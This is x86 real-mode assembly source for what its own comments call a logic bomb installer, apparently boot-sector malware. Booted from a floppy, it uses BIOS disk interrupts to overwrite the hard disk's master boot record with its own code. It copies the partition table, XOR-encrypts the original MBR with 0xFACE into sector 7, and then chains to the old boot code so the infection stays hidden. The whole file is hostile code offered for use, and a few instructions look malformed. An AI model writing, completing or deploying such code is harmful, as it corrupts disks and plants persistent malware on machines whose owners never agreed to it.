call GetAddr
GetAddr:
pop bx   ;set bx to GetAddr

mov ax, 203h 
mov dx,80h
mov cx,1
add bx,509
mov es,cs
int 13h ;     load first 3 sectors of HD to 512 bytes after the beginning of this code

mov ds,cs 
cmp [bx+1022],0AA55h 
jnz SuperWrite ;check 2nd sector of HD for boot signature if not continue to logic bomb install
        sub bx,514 ;set bx to 2 bytes before this code
        mov [bx],13cdh ;write Int 13h to bx location
        push bx ;add bx to stack
        add bx,2
        mov ax,201h
        inc cx
ret ;load HD sector 2 as boot code and run it
 
SuperWrite:
mov dx,0
inc cx
mov ax,203h
int 13h ;load sectors 2, 3 and 4 of disk image to 512 bytes after this code starts

mov dx,80h
mov ax,201h
mov cx,1
add bx,512
int 13h ;move sector 1 of HD to 1024 bytes after this code starts

mov dx,bx 
add dx,512 ;set dx to boot signature on original HD boot sector
add bx,446 ;set bx to start of MBR partition table
 
 MemoryShuntingLoop:
        mov cx,[bx]
        sub bx,512
        mov [bx],cx 
        add bx, 514 ;copy partition table 2 bytes at a time from sector 1 of HD to Sector 2 of Floppy
        cmp bx,dx
jnz MemoryShuntingLoop

sub bx,1024
mov ax,303h
mov cx,1
mov dx,80h
int 13h ;write out sector 1, 2, 3 of HD - Logic bomb's in sector 1 and 3, old MBR code in sector 2.


add bx,512 
mov dx,bx
add dx,512 ;set bx, dx to beginnning, end of old sector 1 of HD in ram.
xor1:
        xor [bx],0faceh
        add bx,2
        cmp bx,dx
jnz xor1 ;Xor old HD sector by 'face' in hex.

mov ax,301h
mov cx,7
mov dx,80h
sub bx,512
int 13h ;save encryped old hd to sector 7


sub bx,514 
mov [bx],13CD
push bx ;write Int 13 to before this code, set stack to jump to it on return

add bx,2
mov ax,201h
mov dx,80h
mov cx,2
ret ;read sector 2 of HD then execute code from boot location
